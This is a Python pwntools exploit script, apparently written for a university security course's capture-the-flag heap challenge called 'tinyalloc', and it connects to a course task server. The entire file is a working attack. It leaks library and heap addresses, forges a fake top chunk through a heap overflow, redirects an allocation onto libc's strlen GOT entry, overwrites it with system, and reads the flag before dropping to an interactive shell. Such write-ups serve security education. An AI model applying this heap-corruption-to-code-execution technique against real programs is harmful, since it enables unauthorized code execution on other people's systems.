#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")
libtinyalloc = pwn.ELF("./libtinyalloc.so")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

# 1) docker compose -f debug.yml up
# 2) docker exec -ti "$(docker ps -q -f 'ancestor=softsec/tinyalloc')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'


conn = pwn.remote('tasks.ws24.softsec.rub.de', 32883)
#conn = pwn.remote('127.0.0.1', 1024)

################################################################

def malloc(index: int, size: int, content: bytes):
    assert 0 <= index < 256
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'Which index do you want to allocate? ', str(index).encode())
    conn.sendlineafter(b'How large do you want the entry to be? ', str(size).encode())
    conn.sendlineafter(b'Enter the contents: ', content)

def free(index: int):
    assert 0 <= index < 256
    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b'Which index do you want to deallocate? ', str(index).encode())

def show(index: int) -> bytes:
    assert 0 <= index < 256
    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'Which index do you want to show? ', str(index).encode())
    return conn.recvline()


################################################################
# locally: libc_offset_to_tinyalloc = 0x1e6000
#  server: libc_offset_to_tinyalloc = 0x1e6000 - 0x1000 * 3
libc_offset_to_tinyalloc = 0x1e6000 - 0x1000 * 3

# 1) get tinyalloc address
conn.recvuntil(b'To test whether the allocator is actually working: malloc is at ')
leaked_address = int(conn.recvline()[:-1], 16)
tiny_alloc_base = leaked_address - libtinyalloc.symbols['malloc']
libc_base = tiny_alloc_base - libc_offset_to_tinyalloc
libc.address = libc_base
libtinyalloc.address = tiny_alloc_base

print(f' tiny base at: {hex(tiny_alloc_base)}')
print(f' libc base at: {hex(libc_base)}')


# 2) leak heap
malloc(0, 0x28, b'A'*0x28)
malloc(1, 0x28, b'B'*0x28)
heap_start = pwn.u64(show(0)[-7:-1] + b'\x00\x00') -0x60

print(f'heap start at: {hex(heap_start)}')

# 3) crate fake top chunk inside chunk_1
fake_chunk_previous = heap_start + 0x30
fake_chunk_header = 0x0c00FFFFFFFFFFFF
payload = pwn.p64(fake_chunk_previous) + pwn.p64(fake_chunk_header) + b'C'*16
free(1)
malloc(1, 0x28, payload)

# 4) overflow chunk_0 to redirect next pointer
payload = b'P'*0x28 + b'\x40'
free(0)
malloc(0, 0x28, payload)

# 5) trigger House of Power attack (fake topchunk, which was size 0xFFFFFFFFFFFF)
free(1)

# 6) malloc huge amount (sothat next malloc returns pointer of desired address)
# works as all requests are served from top chunk, which is huge
got_libc_strlen = libc.address + 0x1d2080
print(f'got strlen at: {hex(got_libc_strlen)}')
offset_to_got = got_libc_strlen - fake_chunk_previous - 0x20
malloc(2, offset_to_got, b'1337')
malloc(3, 8, pwn.p64(libc.symbols['system']))

# 7) trigger strlen call (overriten with system)
malloc(1, 0x28, b'tail /flag\n\x00')
print(show(1))
conn.interactive()
